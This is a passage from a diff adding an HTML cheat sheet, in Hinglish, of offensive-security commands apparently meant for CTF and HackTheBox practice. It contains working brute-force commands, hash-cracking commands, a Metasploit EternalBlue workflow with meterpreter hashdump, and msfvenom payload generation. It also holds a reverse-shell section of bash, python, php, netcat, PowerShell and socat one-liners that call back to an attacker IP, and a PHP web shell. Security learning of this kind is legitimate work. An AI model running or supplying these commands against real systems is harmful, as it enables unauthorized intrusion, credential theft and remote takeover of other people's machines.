+      <div class="cmd-line">evil-winrm <span class="fl">-i</span> <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">Administrator</span> <span class="fl">-p</span> <span class="arg">password123</span></div>
+      <div class="cmd-desc">Password se login</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">evil-winrm <span class="fl">-i</span> <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">Administrator</span> <span class="fl">-H</span> <span class="arg">NTLM_HASH</span></div>
+      <div class="cmd-desc">Pass-the-Hash attack</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">evil-winrm <span class="fl">-i</span> <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">user</span> <span class="fl">-p</span> <span class="arg">pass</span> <span class="fl">-s</span> <span class="arg">./scripts/</span></div>
+      <div class="cmd-desc">PowerShell scripts upload karo</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🐧</div>
+    <div><div class="tool-name">SSH / FTP / Telnet</div></div>
+    <div class="tool-sub"><span class="badge b-g">Remote Access</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="cmd">
+      <div class="cmd-line">ssh <span class="arg">user@TARGET_IP</span></div>
+      <div class="cmd-desc">Basic SSH login</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ssh <span class="fl">-i</span> <span class="arg">id_rsa user@TARGET_IP</span></div>
+      <div class="cmd-desc">Private key se login</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ssh <span class="fl">-L</span> <span class="arg">8080:localhost:80 user@TARGET</span></div>
+      <div class="cmd-desc">Port forwarding — tunnel banana</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ftp <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">FTP connect — anonymous try karo</div>
+    </div>
+    <div class="warn2"><b>⚠️ id_rsa mila?</b> chmod 600 id_rsa — warna SSH permission error dega!</div>
+  </div>
+</div>
+
+</div><!-- smb -->
+
+<!-- ═══════════════════ BRUTE FORCE ═══════════════════ -->
+<div class="sheet" id="s-brute">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔨</div>
+    <div><div class="tool-name">hydra</div></div>
+    <div class="tool-sub"><span class="badge b-r">Brute Force</span> <span class="badge b-y">Network</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Network services pe login brute force karo — SSH, FTP, HTTP, SMB, RDP, MySQL — sab supported hain! Wordlist se passwords try karta hai.</div>
+
+    <div class="cmd-label">⚡ Service-wise Commands</div>
+    <div class="cmd">
+      <div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> <span class="arg">TARGET_IP</span> <span class="fl">ssh</span></div>
+      <div class="cmd-desc">SSH brute force</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> <span class="arg">TARGET_IP</span> <span class="fl">ftp</span></div>
+      <div class="cmd-desc">FTP brute force</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hydra <span class="fl">-L</span> <span class="arg">users.txt</span> <span class="fl">-P</span> <span class="arg">passwords.txt</span> <span class="arg">TARGET_IP</span> <span class="fl">smb</span></div>
+      <div class="cmd-desc">SMB — userlist + passlist</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> <span class="arg">TARGET_IP</span> <span class="fl">mysql</span></div>
+      <div class="cmd-desc">MySQL brute force</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> <span class="arg">TARGET_IP</span> <span class="fl">rdp</span></div>
+      <div class="cmd-desc">RDP brute force</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> <span class="arg">TARGET_IP</span> <span class="fl">http-post-form</span> <span class="arg">"/login:user=^USER^&pass=^PASS^:Invalid"</span></div>
+      <div class="cmd-desc">HTTP form brute — login page</div>
+    </div>
+
+    <table class="flags">
+      <tr><th>Flag</th><th>Matlab</th></tr>
+      <tr><td>-l username</td><td>Single username</td></tr>
+      <tr><td>-L file</td><td>Username list (file)</td></tr>
+      <tr><td>-p password</td><td>Single password</td></tr>
+      <tr><td>-P file</td><td>Password list (file)</td></tr>
+      <tr><td>-t 16</td><td>16 threads parallel</td></tr>
+      <tr><td>-s PORT</td><td>Custom port</td></tr>
+      <tr><td>-f</td><td>Pehla match milte hi stop karo</td></tr>
+      <tr><td>-V</td><td>Verbose — har attempt dikhao</td></tr>
+      <tr><td>-o file</td><td>Output file</td></tr>
+    </table>
+
+    <div class="tip2"><b>💡 Best Wordlist:</b> /usr/share/wordlists/rockyou.txt — 14 million passwords! HTB mein mostly yahi kaam aata hai.</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🐍</div>
+    <div><div class="tool-name">medusa</div></div>
+    <div class="tool-sub"><span class="badge b-r">Brute Force</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Hydra jaise hi — network login brute force. Hydra se thoda alag syntax, kuch services mein better kaam karta hai.</div>
+    <div class="cmd">
+      <div class="cmd-line">medusa <span class="fl">-h</span> <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> <span class="fl">-M</span> <span class="arg">ssh</span></div>
+      <div class="cmd-desc">SSH brute force</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">medusa <span class="fl">-h</span> <span class="arg">TARGET</span> <span class="fl">-U</span> <span class="arg">users.txt</span> <span class="fl">-P</span> <span class="arg">pass.txt</span> <span class="fl">-M</span> <span class="arg">ftp</span> <span class="fl">-t</span> <span class="arg">4</span></div>
+      <div class="cmd-desc">FTP — userlist + passlist + threads</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔐</div>
+    <div><div class="tool-name">patator</div></div>
+    <div class="tool-sub"><span class="badge b-r">Brute Force</span> <span class="badge b-y">Advanced</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Hydra/Medusa ka advanced version — zyada control, filter karo, response size se match karo. Complex scenarios ke liye.</div>
+    <div class="cmd">
+      <div class="cmd-line">patator ssh_login <span class="arg">host=TARGET_IP</span> <span class="arg">user=admin</span> <span class="arg">password=FILE0</span> <span class="arg">0=rockyou.txt</span></div>
+      <div class="cmd-desc">SSH brute force</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">patator http_fuzz <span class="arg">url=http://TARGET/login</span> <span class="arg">method=POST</span> <span class="arg">body='user=FILE0&pass=FILE1'</span> <span class="arg">0=users.txt 1=pass.txt</span> <span class="fl">-x ignore:fgrep='Invalid'</span></div>
+      <div class="cmd-desc">HTTP form — "Invalid" response ignore karo</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- brute -->
+
+<!-- ═══════════════════ HASH CRACKING ═══════════════════ -->
+<div class="sheet" id="s-hash">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔑</div>
+    <div><div class="tool-name">john the ripper</div></div>
+    <div class="tool-sub"><span class="badge b-y">Hash Crack</span> <span class="badge b-p">Offline</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Password hashes crack karo — MD5, SHA, NTLM, bcrypt, zip passwords, SSH keys, PDF passwords. CTF mein bahut kaam aata hai!</div>
+
+    <div class="cmd-label">⚡ Common Uses</div>
+    <div class="cmd">
+      <div class="cmd-line">john <span class="fl">--wordlist=</span><span class="arg">rockyou.txt</span> <span class="arg">hash.txt</span></div>
+      <div class="cmd-desc">Wordlist se hash crack karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">john <span class="arg">hash.txt</span> <span class="fl">--format=</span><span class="arg">Raw-MD5</span> <span class="fl">--wordlist=</span><span class="arg">rockyou.txt</span></div>
+      <div class="cmd-desc">Format specify karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">john <span class="arg">hash.txt</span> <span class="fl">--show</span></div>
+      <div class="cmd-desc">Already cracked passwords dikhao</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ssh2john <span class="arg">id_rsa</span> &gt; <span class="arg">ssh_hash.txt</span> &amp;&amp; john <span class="arg">ssh_hash.txt</span> <span class="fl">--wordlist=</span><span class="arg">rockyou.txt</span></div>
+      <div class="cmd-desc">SSH private key crack karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">zip2john <span class="arg">file.zip</span> &gt; <span class="arg">zip_hash.txt</span> &amp;&amp; john <span class="arg">zip_hash.txt</span> <span class="fl">--wordlist=</span><span class="arg">rockyou.txt</span></div>
+      <div class="cmd-desc">ZIP password crack karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">pdf2john <span class="arg">file.pdf</span> &gt; <span class="arg">pdf_hash.txt</span> &amp;&amp; john <span class="arg">pdf_hash.txt</span></div>
+      <div class="cmd-desc">PDF password crack karo</div>
+    </div>
+
+    <table class="flags">
+      <tr><th>Format (--format=)</th><th>Kab use karein</th></tr>
+      <tr><td>Raw-MD5</td><td>MD5 hashes: d8578edf...</td></tr>
+      <tr><td>Raw-SHA1</td><td>SHA1: da39a3ee...</td></tr>
+      <tr><td>NT</td><td>Windows NTLM hashes</td></tr>
+      <tr><td>bcrypt</td><td>$2a$, $2b$ hashes</td></tr>
+      <tr><td>sha512crypt</td><td>Linux /etc/shadow $6$</td></tr>
+      <tr><td>md5crypt</td><td>Linux shadow $1$</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">⚡</div>
+    <div><div class="tool-name">hashcat</div></div>
+    <div class="tool-sub"><span class="badge b-y">Hash Crack</span> <span class="badge b-r">GPU Powered</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>World's fastest hash cracker — GPU use karta hai! John se zyada fast. Complex hashes jaise bcrypt ke liye better. Dictionary, brute force, rule-based attacks.</div>
+    <div class="cmd">
+      <div class="cmd-line">hashcat <span class="fl">-m</span> <span class="arg">0</span> <span class="arg">hash.txt</span> <span class="arg">rockyou.txt</span></div>
+      <div class="cmd-desc">MD5 crack — wordlist mode</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hashcat <span class="fl">-m</span> <span class="arg">1000</span> <span class="arg">hash.txt</span> <span class="arg">rockyou.txt</span></div>
+      <div class="cmd-desc">NTLM crack</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hashcat <span class="fl">-m</span> <span class="arg">0</span> <span class="arg">hash.txt</span> <span class="arg">rockyou.txt</span> <span class="fl">-r</span> <span class="arg">/usr/share/hashcat/rules/best64.rule</span></div>
+      <div class="cmd-desc">Rules ke saath — variations try karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hashcat <span class="fl">-m</span> <span class="arg">0</span> <span class="arg">hash.txt</span> <span class="fl">-a</span> <span class="arg">3</span> <span class="arg">?a?a?a?a?a?a</span></div>
+      <div class="cmd-desc">Brute force — 6 char sab possible</div>
+    </div>
+
+    <table class="flags">
+      <tr><th>-m (Hash Mode)</th><th>Hash Type</th></tr>
+      <tr><td>0</td><td>MD5</td></tr>
+      <tr><td>100</td><td>SHA1</td></tr>
+      <tr><td>1400</td><td>SHA256</td></tr>
+      <tr><td>1000</td><td>NTLM (Windows)</td></tr>
+      <tr><td>3200</td><td>bcrypt</td></tr>
+      <tr><td>500</td><td>md5crypt ($1$)</td></tr>
+      <tr><td>1800</td><td>sha512crypt ($6$)</td></tr>
+      <tr><td>13100</td><td>Kerberoast (TGS-REP)</td></tr>
+      <tr><td>18200</td><td>AS-REP Roast</td></tr>
+    </table>
+
+    <div class="tip2"><b>💡 Hash Type Kaise Pata Karo?</b><br>
+<code style="background:#21262d;color:#7ee787;padding:2px 8px;border-radius:4px;font-family:'Courier New',monospace;font-size:11px">hash-identifier</code> ya <code style="background:#21262d;color:#7ee787;padding:2px 8px;border-radius:4px;font-family:'Courier New',monospace;font-size:11px">hashid hash.txt</code> — automatically identify karega!</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔍</div>
+    <div><div class="tool-name">hash-identifier + hashid</div></div>
+    <div class="tool-sub"><span class="badge b-y">Hash</span> <span class="badge b-r">Identify</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Hash dekho aur pata karo ye kaunsa type hai — MD5? SHA1? NTLM? bcrypt? Pehle identify karo, phir crack karo!</div>
+    <div class="cmd">
+      <div class="cmd-line">hash-identifier</div>
+      <div class="cmd-desc">Interactive — hash paste karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hashid <span class="arg">'d8578edf8458ce06fbc5bb76a58c5ca4'</span></div>
+      <div class="cmd-desc">Hash paste karke pata karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hashid <span class="fl">-m</span> <span class="arg">hash.txt</span></div>
+      <div class="cmd-desc">hashcat mode bhi batao</div>
+    </div>
+    <div class="tip2"><b>💡 Online Tool:</b> https://crackstation.net — famous hashes already cracked database mein hoti hain! Try karo pehle!</div>
+  </div>
+</div>
+
+</div><!-- hash -->
+
+<!-- ═══════════════════ EXPLOIT ═══════════════════ -->
+<div class="sheet" id="s-exploit">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">💣</div>
+    <div><div class="tool-name">Metasploit (msfconsole)</div></div>
+    <div class="tool-sub"><span class="badge b-b">Exploitation</span> <span class="badge b-p">Post-Exploit</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>World's most famous exploitation framework! Thousands of exploits ready-made hain — dhundho, configure karo, launch karo. Meterpreter shell milegi!</div>
+
+    <div class="cmd-label">⚡ Basic Workflow</div>
+    <div class="cmd">
+      <div class="cmd-line">msfconsole</div>
+      <div class="cmd-desc">MSF shuru karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">search <span class="arg">eternalblue</span></div>
+      <div class="cmd-desc">Exploit dhundho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">use <span class="arg">exploit/windows/smb/ms17_010_eternalblue</span></div>
+      <div class="cmd-desc">Exploit select karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">show options</div>
+      <div class="cmd-desc">Required options dekho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">set RHOSTS <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">Target IP set karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">set LHOST <span class="arg">YOUR_IP</span></div>
+      <div class="cmd-desc">Apni IP set karo (listener)</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">set LPORT <span class="arg">4444</span></div>
+      <div class="cmd-desc">Listening port</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">run</div>
+      <div class="cmd-desc">Exploit launch karo!</div>
+    </div>
+
+    <div class="cmd-label">🐲 Meterpreter Commands (shell milne ke baad)</div>
+    <div class="cmd">
+      <div class="cmd-line">sysinfo</div>
+      <div class="cmd-desc">System info — OS, hostname</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">getuid</div>
+      <div class="cmd-desc">Current user kaun hai</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">getsystem</div>
+      <div class="cmd-desc">SYSTEM privilege lene ki koshish</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">hashdump</div>
+      <div class="cmd-desc">Windows password hashes dump karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">upload <span class="arg">/path/file</span> <span class="arg">C:\\Windows\\</span></div>
+      <div class="cmd-desc">File upload karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">download <span class="arg">C:\\Users\\Admin\\flag.txt</span></div>
+      <div class="cmd-desc">Flag download karo!</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">shell</div>
+      <div class="cmd-desc">Command prompt mein jao</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">background</div>
+      <div class="cmd-desc">Session background mein daalo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">sessions <span class="fl">-l</span></div>
+      <div class="cmd-desc">Sab active sessions dekho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">sessions <span class="fl">-i</span> <span class="arg">1</span></div>
+      <div class="cmd-desc">Session 1 pe wapas jao</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔍</div>
+    <div><div class="tool-name">searchsploit</div></div>
+    <div class="tool-sub"><span class="badge b-b">Exploit DB</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Exploit-DB ka offline version. Service aur version ke liye known exploits dhundho — without internet!</div>
+    <div class="cmd">
+      <div class="cmd-line">searchsploit <span class="arg">apache 2.4.18</span></div>
+      <div class="cmd-desc">Apache version ke exploits</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">searchsploit <span class="arg">samba 4.7</span></div>
+      <div class="cmd-desc">Samba ke exploits</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">searchsploit <span class="fl">-m</span> <span class="arg">42315</span></div>
+      <div class="cmd-desc">Exploit copy karo current dir mein</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">searchsploit <span class="fl">--update</span></div>
+      <div class="cmd-desc">Database update karo</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🎭</div>
+    <div><div class="tool-name">msfvenom</div></div>
+    <div class="tool-sub"><span class="badge b-b">Payload</span> <span class="badge b-r">Generator</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Custom payloads/shellcode generate karo — reverse shells, bind shells, exe files, PHP shells — sab kuch. MSF ka payload generator.</div>
+    <div class="cmd">
+      <div class="cmd-line">msfvenom <span class="fl">-p</span> <span class="arg">windows/x64/shell_reverse_tcp</span> <span class="fl">LHOST=</span><span class="arg">YOUR_IP</span> <span class="fl">LPORT=</span><span class="arg">4444</span> <span class="fl">-f</span> <span class="arg">exe</span> <span class="fl">-o</span> <span class="arg">shell.exe</span></div>
+      <div class="cmd-desc">Windows reverse shell EXE</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">msfvenom <span class="fl">-p</span> <span class="arg">php/reverse_php</span> <span class="fl">LHOST=</span><span class="arg">YOUR_IP</span> <span class="fl">LPORT=</span><span class="arg">4444</span> <span class="fl">-f</span> <span class="arg">raw</span> <span class="fl">-o</span> <span class="arg">shell.php</span></div>
+      <div class="cmd-desc">PHP reverse shell</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">msfvenom <span class="fl">-p</span> <span class="arg">linux/x64/shell_reverse_tcp</span> <span class="fl">LHOST=</span><span class="arg">IP</span> <span class="fl">LPORT=</span><span class="arg">4444</span> <span class="fl">-f</span> <span class="arg">elf</span> <span class="fl">-o</span> <span class="arg">shell</span></div>
+      <div class="cmd-desc">Linux ELF binary</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">msfvenom <span class="fl">-l</span> <span class="arg">payloads</span> | grep <span class="arg">windows/x64</span></div>
+      <div class="cmd-desc">Available payloads list</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- exploit -->
+
+<!-- ═══════════════════ SHELLS ═══════════════════ -->
+<div class="sheet" id="s-shells">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🐚</div>
+    <div><div class="tool-name">Reverse Shell Cheat Sheet</div></div>
+    <div class="tool-sub"><span class="badge b-b">Shells</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya hota hai</b>Reverse shell = victim machine tum se connect karta hai (outbound). Isliye firewall bypass ho jaata hai! Tum pehle nc listener chalao, phir victim pe shell trigger karo.</div>
+
+    <div class="cmd-label">👂 Step 1: Pehle Listen karo (Apni machine pe)</div>
+    <div class="cmd">
+      <div class="cmd-line">nc <span class="fl">-lvnp</span> <span class="arg">4444</span></div>
+      <div class="cmd-desc">netcat listener — shell yahan aayega</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">rlwrap nc <span class="fl">-lvnp</span> <span class="arg">4444</span></div>
+      <div class="cmd-desc">rlwrap = arrow keys aur history kaam kare!</div>
+    </div>
+
+    <div class="cmd-label">💥 Step 2: Victim pe Run karo (RCE mile toh)</div>
+    <div class="cmd">
+      <div class="cmd-line">bash <span class="fl">-c</span> <span class="arg">'bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1'</span></div>
+      <div class="cmd-desc">Bash reverse shell — Linux</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">python3 <span class="fl">-c</span> <span class="arg">'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</span></div>
+      <div class="cmd-desc">Python3 reverse shell</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">php <span class="fl">-r</span> <span class="arg">'$sock=fsockopen("YOUR_IP",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div>
+      <div class="cmd-desc">PHP reverse shell</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nc <span class="arg">YOUR_IP</span> <span class="arg">4444</span> <span class="fl">-e</span> <span class="arg">/bin/bash</span></div>
+      <div class="cmd-desc">Netcat reverse shell (agar -e support kare)</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nc <span class="arg">YOUR_IP</span> <span class="arg">4444</span>; mkfifo /tmp/f; cat /tmp/f | /bin/bash 2&gt;&amp;1 | nc <span class="arg">YOUR_IP</span> <span class="arg">4444</span> &gt; /tmp/f</div>
+      <div class="cmd-desc">nc bina -e ke — mkfifo trick</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">powershell <span class="fl">-nop -c</span> <span class="arg">"$client=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</span></div>
+      <div class="cmd-desc">PowerShell reverse shell — Windows</div>
+    </div>
+
+    <div class="cmd-label">🔧 Shell Upgrade — TTY karo (Limited shell milne ke baad)</div>
+    <div class="cmd">
+      <div class="cmd-line">python3 <span class="fl">-c</span> <span class="arg">'import pty;pty.spawn("/bin/bash")'</span></div>
+      <div class="cmd-desc">Step 1: PTY spawn karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">Ctrl+Z → stty raw -echo → fg</div>
+      <div class="cmd-desc">Step 2: Terminal raw mode</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">export TERM=xterm</div>
+      <div class="cmd-desc">Step 3: TERM set karo — clear command kaam kare</div>
+    </div>
+    <div class="tip2"><b>💡 RevShells.com!</b> Website pe apni IP aur port dalo — sab languages ke reverse shells ready milenge! https://www.revshells.com</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔊</div>
+    <div><div class="tool-name">socat</div></div>
+    <div class="tool-sub"><span class="badge b-b">Shells</span> <span class="badge b-p">Port Forward</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>netcat ka powerful version — stable TTY shells, port forwarding, SSL tunnels sab kuch. Iska shell netcat se better stable hota hai!</div>
+    <div class="cmd">
+      <div class="cmd-line">socat TCP-L:<span class="arg">4444</span> <span class="arg">-</span></div>
+      <div class="cmd-desc">Listener — apni machine pe</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">socat TCP:<span class="arg">YOUR_IP:4444</span> EXEC:<span class="arg">"bash -li"</span>,pty,stderr,sigint,setsid,sane</div>
+      <div class="cmd-desc">Victim pe — fully stable TTY shell!</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🌐</div>
+    <div><div class="tool-name">Web Shells</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-b">Shells</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya hota hai</b>Web server pe PHP/ASPX/JSP file upload karo jisme command execution ho — browser se commands run karo!</div>
+    <div class="cmd-label">PHP Web Shell (file upload vulnerability mein)</div>
+    <div class="cmd">
+      <div class="cmd-line">&lt;?php system($_GET['cmd']); ?&gt;</div>
+      <div class="cmd-desc">Simplest PHP web shell — cmd=whoami</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">curl <span class="arg">http://TARGET/shell.php?cmd=id</span></div>
+      <div class="cmd-desc">Command run karo — curl se</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">/usr/share/webshells/php/php-reverse-shell.php</div>
+      <div class="cmd-desc">Kali mein ready-made reverse shell — IP aur port change karo!</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- shells -->
+
+<!-- ═══════════════════ CRYPTO/DECODE ═══════════════════ -->
+<div class="sheet" id="s-crypto">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔒</div>
+    <div><div class="tool-name">Base64 / Base32 / Hex</div></div>
+    <div class="tool-sub"><span class="badge b-g">Decode</span> <span class="badge b-y">Encode</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>CTF mein encoded data milta hai — base64, hex, binary — inhe decode karo! Terminal se seedha kar sakte ho.</div>
+    <div class="cmd">
+      <div class="cmd-line">echo <span class="arg">"SGVsbG8="</span> | base64 <span class="fl">-d</span></div>
+      <div class="cmd-desc">Base64 decode</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">echo <span class="arg">"Hello"</span> | base64</div>
+      <div class="cmd-desc">Base64 encode</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">echo <span class="arg">"48656c6c6f"</span> | xxd <span class="fl">-r -p</span></div>
+      <div class="cmd-desc">Hex decode</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">echo <span class="arg">"Hello"</span> | xxd</div>
+      <div class="cmd-desc">Hex encode / view</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">cat <span class="arg">file</span> | xxd | head</div>
+      <div class="cmd-desc">File ke pehle bytes hex mein dekho</div>
+    </div>
+    <div class="tip2"><b>💡 CyberChef!</b> https://gchq.github.io/CyberChef — browser mein sab encoding/decoding/transformations! CTF ka best friend!</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔐</div>
+    <div><div class="tool-name">openssl</div></div>
+    <div class="tool-sub"><span class="badge b-g">Crypto</span> <span class="badge b-y">Certificates</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>SSL/TLS certificates dekho, encrypt/decrypt karo, hashes generate karo, private keys handle karo.</div>
+    <div class="cmd">
+      <div class="cmd-line">openssl s_client <span class="fl">-connect</span> <span class="arg">TARGET:443</span></div>
+      <div class="cmd-desc">SSL certificate info dekho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">openssl x509 <span class="fl">-in</span> <span class="arg">cert.pem</span> <span class="fl">-text</span></div>
+      <div class="cmd-desc">Certificate read karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">openssl enc <span class="fl">-aes-256-cbc -d -in</span> <span class="arg">file.enc</span> <span class="fl">-out</span> <span class="arg">file.dec</span> <span class="fl">-k</span> <span class="arg">password</span></div>
+      <div class="cmd-desc">AES decrypt karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">openssl passwd <span class="fl">-6</span> <span class="arg">mypassword</span></div>
+      <div class="cmd-desc">SHA512 password hash generate karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">openssl rsa <span class="fl">-in</span> <span class="arg">private.pem</span> <span class="fl">-text</span></div>
+      <div class="cmd-desc">RSA private key dekho</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔑</div>
+    <div><div class="tool-name">GPG / PGP</div></div>
+    <div class="tool-sub"><span class="badge b-g">Crypto</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>GPG encrypted files decrypt karo, keys import karo. CTF mein .gpg files milti hain unhe decrypt karne ke liye.</div>
+    <div class="cmd">
+      <div class="cmd-line">gpg <span class="fl">--import</span> <span class="arg">private.key</span></div>
+      <div class="cmd-desc">Private key import karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">gpg <span class="fl">-d</span> <span class="arg">message.gpg</span></div>
+      <div class="cmd-desc">Decrypt karo</div>
+    </div>
+    <div class="cmd">
